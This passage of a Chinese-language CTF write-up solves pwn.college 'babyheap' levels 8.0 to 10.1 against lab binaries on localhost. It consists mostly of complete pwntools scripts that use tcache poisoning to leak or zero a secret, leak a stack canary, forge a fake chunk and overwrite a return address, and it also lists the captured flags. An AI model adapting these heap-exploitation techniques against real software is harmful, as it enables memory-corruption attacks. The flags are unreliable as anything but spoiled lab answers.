不过回想起去年，也让 AI 写过多线程爆破的脚本，相比那次，这次代码质量算高了好几倍了，发展的还是很快的/悲

遂又去思考更好的方法，思考能不能泄漏完整的 secret 。想了整整一下午，没想出来，感觉完整泄漏好像不太可能，然后盯着检测代码发呆，~试图看穿屏幕……~

```c
    if ( strcmp(s1, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", s1);
    puts(s_0);
    if ( !memcmp(s1, s2_0, 0x10u) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
```

既然不能泄漏完整的 secret，那还有没有其它通过这个检测的方法呢？思考……突然灵光闪现，因为 malloc 从 tcache 取 chunk 会将它的 key 清空，那如果我们 malloc 到 secret 前面，然后让 `tcache_get` 将 secret 的前 8 字节清空，是不是就相当于知道了 secret 的前 8 字节为 NULL？然后结合我们之前的思路，可以泄漏后 8 字节……草，出了！

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    flat,
    p32,
    process,
    raw_input,
    remote,
)


FILE = "/challenge/babyheap_level8.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def scanf(idx, data):
    target.sendlineafter(b": ", b"scanf")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendline(data)


def send_flag(secret):
    target.sendlineafter(b": ", b"send_flag")
    target.sendlineafter(b"Secret: ", secret)


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    secret = elf.bss() + 0x1230A + 0x8
    zero_out = elf.bss() + 0x1230A - 0x8

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret))
    malloc(0, 0)
    malloc(0, 0)
    puts(0)
    target.recvuntil(b"Data: ")
    secret = target.recvline().strip()

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    # raw_input("DEBUG")
    scanf(0, p32(zero_out))
    malloc(0, 0)
    malloc(0, 0)

    # raw_input("DEBUG")
    payload = flat(
        0,
        secret,
    )
    send_flag(payload)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{4xf_sG0yXaGhMXdibln3SOAB5xv.0VN4MDL5cTNxgzW}`]

# Level 8.1

## Information

- Category: Pwn

## Description

> Leverage TCACHE exploits to pass a validation check.

## Write-up

参见 [Level 8.0](#level-80)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    flat,
    p32,
    process,
    raw_input,
    remote,
)


FILE = "/challenge/babyheap_level8.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendlineafter(b"Size: ", str(size).encode("ascii"))


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))


def scanf(idx, data):
    target.sendlineafter(b": ", b"scanf")
    target.sendlineafter(b"Index: ", str(idx).encode("ascii"))
    target.sendline(data)


def send_flag(secret):
    target.sendlineafter(b": ", b"send_flag")
    target.sendlineafter(b"Secret: ", secret)


def quit():
    target.sendlineafter(b": ", b"quit")


def main():
    launch()

    secret = elf.bss() + 0x19E0A + 0x8
    zero_out = elf.bss() + 0x19E0A - 0x8

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret))
    malloc(0, 0)
    malloc(0, 0)
    puts(0)
    target.recvuntil(b"Data: ")
    secret = target.recvline().strip()

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    # raw_input("DEBUG")
    scanf(0, p32(zero_out))
    malloc(0, 0)
    malloc(0, 0)

    # raw_input("DEBUG")
    payload = flat(
        0,
        secret,
    )
    send_flag(payload)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{0K4zGLVnFNCz2zhqd0R7tWLsOLW.0lN4MDL5cTNxgzW}`]

# Level 9.0

## Information

- Category: Pwn

## Description

> Leverage TCACHE exploits to pass a validation check.

## Write-up

和上题一样，但是这次不能分配到 secret 附近了，泄漏完全不可能。不过还是可以利用 `tcache_get` 清空 NULL 的特性将 secret 完全清空，这样我们就知道 secret 为 NULL 了。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    flat,
    p32,
    process,
    raw_input,
    remote,
)


FILE = "/challenge/babyheap_level9.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode())
    target.sendlineafter(b"Size: ", str(size).encode())


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode())


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode())


def scanf(idx, data):
    target.sendlineafter(b": ", b"scanf")
    target.sendlineafter(b"Index: ", str(idx).encode())
    target.sendline(data)


def send_flag(secret):
    target.sendlineafter(b": ", b"send_flag")
    target.sendlineafter(b"Secret: ", secret)


def quit():
    target.sendlineafter(b": ", b"quit")


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    secret_p1 = elf.bss() + (0x16364 - 0x8)
    secret_p2 = elf.bss() + 0x16364

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret_p1))
    # raw_input("DEBUG")
    malloc(0, 0)
    malloc(0, 0)

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret_p2))
    # raw_input("DEBUG")
    malloc(0, 0)
    malloc(0, 0)

    payload = flat(0, 0)
    send_flag(payload)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{klIR9JBrG0FfOAzXz_dLAeG0C5g.01N4MDL5cTNxgzW}`]

# Level 9.1

## Information

- Category: Pwn

## Description

> Leverage TCACHE exploits to pass a validation check.

## Write-up

参见 [Level 9.0](#level-90)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    flat,
    p32,
    process,
    raw_input,
    remote,
)


FILE = "/challenge/babyheap_level9.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode())
    target.sendlineafter(b"Size: ", str(size).encode())


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode())


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode())


def scanf(idx, data):
    target.sendlineafter(b": ", b"scanf")
    target.sendlineafter(b"Index: ", str(idx).encode())
    target.sendline(data)


def send_flag(secret):
    target.sendlineafter(b": ", b"send_flag")
    target.sendlineafter(b"Secret: ", secret)


def quit():
    target.sendlineafter(b": ", b"quit")


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    secret_p1 = elf.bss() + (0x12821 - 0x8)
    secret_p2 = elf.bss() + 0x12821

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret_p1))
    # raw_input("DEBUG")
    malloc(0, 0)
    malloc(0, 0)

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    scanf(0, p32(secret_p2))
    # raw_input("DEBUG")
    malloc(0, 0)
    malloc(0, 0)

    payload = flat(0, 0)
    send_flag(payload)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{YpgPY9CRd5Wk4FCJ7klY0D4fwXX.0FO4MDL5cTNxgzW}`]

# Level 10.0

## Information

- Category: Pwn

## Description

> Leverage TCACHE exploits to gain control flow.

## Write-up

这题嘛，保护全开，但是直接泄漏给我们栈地址和程序代码段地址了，发现后门函数 `win`，那想法自然是令 malloc 返回栈地址，然后我们 scanf 向栈内输入数据溢出返回地址 balabala ～

由于程序使用了 `malloc_usable_size` 来确定输入大小，所以我们还得伪造一个 chunk size 来欺骗这个函数，才能得到足够的输入空间。此外，canary 也需要我们提前泄漏出来。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    flat,
    p64,
    process,
    raw_input,
    remote,
)


FILE = "/challenge/babyheap_level10.0"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode())
    target.sendlineafter(b"Size: ", str(size).encode())


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode())


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode())


def scanf(idx, data):
    target.sendlineafter(b": ", b"scanf")
    target.sendlineafter(b"Index: ", str(idx).encode())
    target.sendline(data)


def quit():
    target.sendlineafter(b": ", b"quit")


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    target.recvuntil(b"allocations is at: ")
    stack = int(target.recvline().strip()[:-1], 16)
    target.recvuntil(b"main is at: ")
    pie_base = int(target.recvline().strip()[:-1], 16) - 0x1AFD

    fake_chunk = stack + 0x10
    canary = stack + 0x108
    win = pie_base + 0x1A00

    target.success(f"stack: {hex(stack)}")
    target.success(f"pie_base: {hex(pie_base)}")
    target.success(f"fake_chunk: {hex(fake_chunk)}")
    target.success(f"canary: {hex(canary)}")
    target.success(f"win: {hex(win)}")

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)

    # raw_input("DEBUG")
    scanf(0, p64(canary + 1))
    malloc(0, 0)
    malloc(0, 0)
    puts(0)
    target.recvuntil(b"Data: ")
    canary = int.from_bytes(target.recvline().strip().rjust(0x8, b"\x00"), "little")
    target.success(f"canary: {hex(canary)}")

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    # raw_input("DEBUG")
    scanf(0, p64(stack))
    malloc(0, 0)
    malloc(0, 0)

    # fake chunk
    payload = flat(
        0,
        0x200, # chunk size
    )
    scanf(0, payload)

    malloc(2, 0)
    malloc(3, 0)
    free(3)
    free(2)
    # raw_input("DEBUG")
    scanf(2, p64(fake_chunk))
    malloc(2, 0)
    malloc(2, 0)

    payload = flat(
        b"A" * 0xF8,
        canary,
        0,  # rbp
        win,
    )
    # raw_input("DEBUG")
    scanf(2, payload)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{0qLPdKCSvtNobMR6JycB-1ThuJM.0VO4MDL5cTNxgzW}`]

# Level 10.1

## Information

- Category: Pwn

## Description

> Leverage TCACHE exploits to gain control flow.

## Write-up

参见 [Level 10.0](#level-100)。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    flat,
    p64,
    process,
    raw_input,
    remote,
)


FILE = "/challenge/babyheap_level10.1"
HOST, PORT = "localhost", 1337

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def malloc(idx, size):
    target.sendlineafter(b": ", b"malloc")
    target.sendlineafter(b"Index: ", str(idx).encode())
    target.sendlineafter(b"Size: ", str(size).encode())


def free(idx):
    target.sendlineafter(b": ", b"free")
    target.sendlineafter(b"Index: ", str(idx).encode())


def puts(idx):
    target.sendlineafter(b": ", b"puts")
    target.sendlineafter(b"Index: ", str(idx).encode())


def scanf(idx, data):
    target.sendlineafter(b": ", b"scanf")
    target.sendlineafter(b"Index: ", str(idx).encode())
    target.sendline(data)


def quit():
    target.sendlineafter(b": ", b"quit")


def launch():
    global target
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)


def main():
    launch()

    target.recvuntil(b"allocations is at: ")
    stack = int(target.recvline().strip()[:-1], 16)
    target.recvuntil(b"main is at: ")
    pie_base = int(target.recvline().strip()[:-1], 16) - 0x1AFD

    fake_chunk = stack + 0x10
    canary = stack + 0x108
    win = pie_base + 0x1A00

    target.success(f"stack: {hex(stack)}")
    target.success(f"pie_base: {hex(pie_base)}")
    target.success(f"fake_chunk: {hex(fake_chunk)}")
    target.success(f"canary: {hex(canary)}")
    target.success(f"win: {hex(win)}")

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)

    # raw_input("DEBUG")
    scanf(0, p64(canary + 1))
    malloc(0, 0)
    malloc(0, 0)
    puts(0)
    target.recvuntil(b"Data: ")
    canary = int.from_bytes(target.recvline().strip().rjust(0x8, b"\x00"), "little")
    target.success(f"canary: {hex(canary)}")

    malloc(0, 0)
    malloc(1, 0)
    free(1)
    free(0)
    # raw_input("DEBUG")
    scanf(0, p64(stack))
    malloc(0, 0)
    malloc(0, 0)

    # fake chunk
    payload = flat(
        0,
        0x200,  # chunk size
    )
    scanf(0, payload)

    malloc(2, 0)
    malloc(3, 0)
    free(3)
    free(2)
    # raw_input("DEBUG")
    scanf(2, p64(fake_chunk))
    malloc(2, 0)
    malloc(2, 0)

    payload = flat(
        b"A" * 0xF8,
        canary,
        0,  # rbp
        win,
    )
    # raw_input("DEBUG")
    scanf(2, payload)
    quit()

    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

:spoiler[`pwn.college{IVJX2ecO9cCeTd-08IgNfDhvyxY.0FM5MDL5cTNxgzW}`]
